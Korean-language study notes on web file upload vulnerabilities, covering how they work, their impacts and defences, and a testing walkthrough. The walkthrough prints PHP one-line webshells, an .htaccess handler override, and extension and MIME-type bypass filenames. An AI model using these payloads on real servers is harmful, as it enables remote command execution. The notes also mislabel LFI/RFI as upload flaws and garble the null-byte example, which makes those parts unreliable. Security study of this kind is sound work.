# 파일 업로드 취약점

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/57

# 파일 업로드 취약점이란?
파일 업로드 취약점은 웹 애플리케이션이 파일이 업로드되기 전에 유효성 검사가 구현되지 않았거나, 안전하지 않은 방식으로 구현된 경우 악성 파일을 업로드 할 수 있는 취약점이다. 오늘날의 웹 애플리케이션들은 일반적으로 사용자 프로필 사진 업로드나, 게시판의 파일 첨부 및 게시판 본문 내용에 이미지 삽입등과 같이 파일 업로드 기능을 제공한다. 이런 파일 업로드 기능이 가능하다면 공격자는 서버가 기대하는 정상적인 이미지나 동영상 파일이 아닌 웹쉘 또는 리버스쉘 같은 파일을 업로드하여 시스템 명령을 실행하거나 다른 시스템 공격을 위한 경유지로 악용하는 등의 서버측 공격을 할 수 있다. 또한 XSS, 피싱 페이지 삽입과 같은 클라이언트 측 공격도 가능하게 할 수 있다.

# 파일 업로드 취약점의 동작 원리
우선 웹 애플리케이션에서 어떻게 파일 업로드가 처리되는지 확인을 해야한다. 사용자가 파일을 업로드하면 업로드된 파일은 어딘가에 저장된다. 이떄 파일이 저장되는 위치는 개발자가 지정한 저장 공간으로 웹 애플리케이션마다 다르게 저장될 수 있다. 동일한 웹 서버가 될 수도 있고, 물리적으로 다른 서버 또는 별도의 스토리지가 될 수도 있다. 클라우드라면 AWS의 S3 버킷과 같은 별도의 스토리지에 저장될 수도 있다. 
<br>
파일 업로드 취약점은 일반적으로 업로드 파일의 저장 위치가 웹 애플리케이션이 구동되는 서버와 동일한 서버인 경우 발생한다. 이런 경우 파일의 저장 위치는 서버의 웹 디렉터리의 하위 디렉터리에 저장되는 경우가 일반적이다. apache 웹 서버를 예로 들자면 아래와 같다
```
root
 ├─ home/
 ├─ etc/
 │  ...
 ├─ sys/
 └─ var/
     └─ www/
         └── html/                     <== 웹 루트 (www.example.com)
              ├── uploaded/            <== 업로드된 파일의 저장 위치 (www.example.com/uploaded)
              │      ├── image1.jpg    <== 업로드된 이미지 파일 (www.example.com/uploaded/image1.jpg)
              │      └── image2.png
              ├── includes/
              │      ├── style.css
              │      └── script.js
              └── index.php
```
웹 루트 디렉터리는 도메인과 대응된다. 따라서 URL을 통해서는 웹 루트 디렉터리와 하위 디렉터리로만 접근이 가능하며 루트 상위 디렉터리로는 접근이 불가하다.
개발자는 업로드된 파일을 웹 루트 디렉터리 하위 profile 디렉터리에 저장되도록 구현된 프로필을 업로드 하는 상황을 가정한다
![](https://www.bugbountyclub.com/uploads/images/training/1624850198.png) 

1. 사용자가 자신의 프로필 화면에서 사진을 업로드한다.
2. 업로드한 파일은 웹 루트 하위의 디렉터리인 profile 디렉터리에 저장된다
3. 파일이 업로드된 후 누군가 사용자의 프로필을 조회하면 웹 애플리케이션은 URL을 통해 파일이 저장된 위치의 파일을 가져와 프로필 조회 화면을 띄운다.

여기서 주목해야할 점은, 업로드된 파일은 웹 애플리케이션에 접근이 허용된 누구라도 웹 브라우저에서 URL을 통해 대부분 접근할 수 있다는 점이다. 
이 점을 통해 공격자는 파일 업로드 취약점을 악용할 수 있으며, 공격자 입장에서는 업로드된 파일의 위치를 반드시 파악해야한다.
그럼 어떤 식으로 악용이 가능할까??

공격자 입장에서는 파일 업로드 취약점을 이용해 할 수 있는 가장 매력적인 공격은 웹쉘 또는 리버스쉘이다. 개인적으로 리버스쉘이 가장 좋다고 생각한다
만일 아래와 같은 그림과 같이 공격자가 JPEG, PNG와 같은 이미지 파일이 아니라 PHP,ASP와 같은 스크립팅 언어로 작성된 웹쉘 파일을 업로드 할 수 있다면?
![](https://www.bugbountyclub.com/uploads/images/training/1624850239.png)

공격자는 업로드된 파일의 URL 경로를 확인핳 후 웹 브라우저를 통해 해당 파일에 접근할 수 있을 것이다. 아래와 같은 사진같이 임의의 명령을 실행하여 시스템을 손상 시키거나 공격에 필요한 시스템 정보 및 민감한 정보를 획득 할 수 있게 된다.
![](https://www.bugbountyclub.com/uploads/images/training/1623824629.png)


# 파일 업로드 취약점의 유형
파일 업로드를 저장시키는 형태에 따라 두가지로 나뉜다.
## 로컬 파일 업로드 취약점(Local File Inclusion, LFI)
웹 애플리케이션 자체내에서 사용자가 직접 악성 파일을 업로드 할 수 있는 취약점이다. 공격자는 업로드된 파일을 실행하여 악의적인 행위를 할 수 있게 된다.

## 원격 파일 업로드 퓌약점(Remote File Inclusion, RFI)
웹 애플리케이션 자체에서 사용자가 직접 파일을 업로드할 수는 없으나 인터넷 상에 존재하는 악성파일의 URL을 통해 원격 파일을 요청하게 하여 웹 애플리케이션 서버 내부에 저장할 수 있는 취약점

# 파일 업로드 취약점의 영향

## 원격 명령 실행
웹쉘 업로드를 통해 원격 명령 실행이 가능하고 시스템의 민감한 정보를 획득하거나 시스템을 완전히 손상시킬 수 있다

## 보안 우회
서버 내부의 중요한 파일(.htaccess와 같은 파일)과 동일한 이름의 파일을 업로드하여 해당 파일을 덮어씀으로써 기존 보안 설정을 무력화 하고 다른 공격 실행이 가능해진다

## 피싱 공격
기존 파일을 피싱 페이지로 덮어쓸 경우 해당 페이지를 방문한 사용자는 피싱 공격에 노출된다

## 서비스 중단
대용량 파일을 업로드할 경우, 이를 처리하기 위해 서버 자원이 고갈되고 서비스가 의도치않게 중단될 수 있다

## 클라이언트측 공격
악성 스크립트가 포함된 파일, 악성 파일(멀웨어) 등이 업로드될 경우 해당 파일은 사용자 계정을 탈취하거나 컴퓨터를 감염 또는 손상 시킬 수 있다.

# 파일 업로드 취약점 예방

## 파일 확장자 검증
안전한 파일 확장자만 업로드를 허용하는 화이트리스트 방식의 필터를 적용한다. 위험한 확장자만 차단하는 식의 블랙리스트 방식은 공격자가 시도하는 변형된 공격과 우회 시도를 모두 방어할 수 없다. 이러한 점이 화이트리스트 방식을 사용해야하는 이유 중 하나 이며, 클라이언트측 통제는 공격자에 의해 십게 무력화될 수 있으므로 반드시 서버측에서 수행되도록 한다

## 파일 유형 검증
HTTP를 통해 업로드되는 파일은 Content-Type 헤더와 함께 전송된다. Content-Type 헤더는 파일의 유형을 서버에 알려주는 역할을 한다. 허용할 MIME TYPE를 정하고 업로드되는 파일의 Content-Type 헤더값이 허용된 MIME TYPE 목록에 포함되는지 검사한다. 허용 목록에 포함될 경우에만 파일 업로드를 허용

## 파일 매직바이트(매직 넘버) 검증
매직 넘버는 파일의 형식을 식별하기 위해 파일 첫부분에 기재된 상수 또는 텍스트이다. 안전한 매직바이트를 선별하고 업로드되는 파일의 매직 넘버가 허용 목록에 포함된 매직 넘버인지 검사하고 안전한 파일일 경우에만 업로드를 허용한다

## 파일명 길이 및 파일 용량 제한
서비스 가용성에 영향을 줄 수 있을 만큼의 대용량 파일이 업로드 되는 경우 서비스가 중단될 수 있다. 이를 방지하기 위해 파일 명의 길이와 파일 용량의 크기를 제한한다

## 파일명 변경 또는 난독화
공격자가 파일 업로드 취약점을 악용하려면 업로드된 파일의 위치를 알고 웹 브라우저로 접근이 가능해야한다. 파일 업로드 처리 시 파일명을 변경하거나 난독화를 함으로 써 공격자가 파일의 위치를 식별하는데 어렵게 만든다. 업로드된 파일을 웹브라우저에 다시 로드할 때는 원본 파일명을 사용하지 않고 변경된 파일명을 사용한다.

## 웹 루트 상위에 .htaccess 파일 저장
업로드된 파일이 저장되는 디렉터리에 .htaccess 파일을 저장한다면 이 파일은 공격자에 의해 조작된 파일로 대체 될 수 있으므로, 접근이 불가능한 웹 루트 디렉터리의 상위에 저장하고 .htaccess라는 이름의 파일을 업로드 할 수 없도록 필터링을 구현한다

## 악설 파일 여부 검사
파일을 서버에 저장하기 전에 안티바이러스 소프트웨어를 통해 악성 파일 여부를 검사하고 안전한 경우에만 업로드하게 한다. 또는 컨텐츠 무해화 기술(CDR)을 사용해 파일에 포함된 악성 코드를 제거하면 좋다

## 업로드 파일 저장 위치의 분리
업로드된 파일은 웹 애플리케이션의 코드와 별도의 저장 공간에 저장한다. 웹 루트 외부 디렉터리나 클라우드 기반 저장 장치에 업로드된 파일을 저장 할 수 있다. 업로드된 파일을 원격 파일 서버나 별도의 디스크 파티션에 저장하는 것 또한 공격에 의한 피해를 최소화하는데 도움이 된다


# 파일 업로드 취약점 테스트 방법

## 1. 파일 업로드 기능 식별
웹 애플리케이션의 기능을 사용하며 파일을 업로드할 수 있는 기능 확인

## 2. 정상 파일 업로드 및 URL 확인
식별된 파일 업로드 기능을 통해 정상적인 파일을 업로드하고 웹 애플리케이션에서 해당 파일이 응답에 다시 표시되는 기능을 찾는다. 또한 페이지 소스코드나 속성 정보보기를 통해 파일 URL 주소를 확인한다

## 3. 웹쉘 업로드
PHP로 작성된 간단한 한줄 웹쉘 파일을 만들어 업로드를 해본다
```
# 첫번째
<?php echo shell_exec($_GET['cmd']); ?>

# 두번째
<?php echo passthru($_GET['cmd']); ?>
```
웹쉘이 정상적으로 업로드되고 실행된다면 공격은 성공적이다. 하지만 웹 애플리케이션이 이러한 악성 파일의 업로드를 쉽게 허용하지 않을 수 있다. 필터에 의해 파단되는 경우 필터가 업로드되는 파일의 유효성 검사를 어떤 방식으로 처리하는지 분석하고 우회해야한다.

추가적으로 리버스쉘을 얻기 위해서 revshells.com을 이용하여 다양한 리버스쉘을 획득 할 수 있는 방법을 확인한다

##  4. 필터 분석 및 우회
웹 애플리케이션이 업로드를 허용하는 파일의 종류가 무엇이고 허용하지 않는 파일의 종류가 무엇인지와 업로드 허용 여부를 판단하는 기준은 무엇인지 등의 웹 애플리케이션에서 파일 업로드 시 적용되는 필터를 분석하고 파악하고 우회를 시도한다

### 파일 확장자 검증
개발자는 .php .jsp 등 위험한 파일의 확장자명을 선별한 후 사용자로부터 업로드되는 파일명에 포함된 확장자명을 비교하여 위험한 확장자인 경우 업로드를 차단하는 블랙리스트 방식이나 안전한 확장자인 경우에만 업로드를 허용하는 화이트리스트 방식을 종종 사용한다.

- .htaccess 파일 업로드
웹 서버가 Apache이고, .htaccess 파일을 업로드할 수 있다면 아래의 구문이 포함된 .htaccess 파일을 업로드하여 php파일이 아닌 jpg 파일을 마치 PHP 스크립트처럼 실행할 수 있다
```
AddType application/x-httpd-php .jpg
```
이 구문이 포함된 파일을 성공적으로 업로드하였다면 PHP 웹쉘 코드가 포함된 JPG 파일을 업로드하여 웹쉘 실행이 가능하다

- 대소문자를 혼용한 확장자명
가끔 웹 개발자는 확장자 검사를 위한 문자열 비교 시 실수를 저지르는데 바로 php 확장자만 차단하는 경우이다. 이를 우회하면 아래와 같이 확장자를 변경해 우회할 수 있다
```
shell.pHp
shell.Php
shell.phP
shell.PHp
shell.PhP
```

- 잘 알려지지 않은 확장자
웹 서버의 잘못되거나 불필요한 설정으로 인해 다음과 같은 확장자를 PHP 스크립트로 인식하고 실행시킬 수 있다.
```
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phtm
shell.pht
shell.phar
```

- 확장자 속이기
필터가 사용자로부터 업로드된 파일명에서 첫번째 도트 문자 뒤에 오는 문자열을 추출하여 확장자로 식별하는 경우 확장자를 여러 번 사용하여 우회할 수 있다.
```
shell.jpg.php
shell.png.php
shell.txt.php
```

- NULL 문자 삽입
파일명 중간에 NULL 문자를 끼워넣어 우회가 가능하다. 필터는 이 파일들을 안전한 파일로 인식하지만 시스템에서 NULL은 문자열의 끝을 의미하므로 NULL 문자 뒤의 확장자는 무시되고 정상적으로 PHP 스크립트로 실행된다.
```
shell.php%OO.jpg
shell.php%OO.png
shell.php%OO.txt
```

- MIME TYPE 검증
업로드되는 파일의 MIME TYPE을 검사하여 허용하거나 차단하는 방식이다. Burp Suite 같은 프록시 도구를 이용하여 요청을 가로챈 다음 Content-Type 헤더를 웹 애플리케이션이 허용되는 유형으로 변경하여 우회할 수 있다.
```
# 변경 전 요청 Content-Type
Content-Type: application/x-php

# 변경 후 요청
Content-Type: image/jpeg
```
## 5. 웹쉘 동작 확인
웹쉘이 정상적으로 업로드되었다면 아마 웹쉘은 2. 에서 확인했던 위치에 저장된다. 웹 브라우저에서 웹쉘의 URL을 방문해보고 웹쉘에서 명령 실행에 사용된 cmd 매개변수를 통해 시스템에 무해한 명령을 테스트로 전송해본다

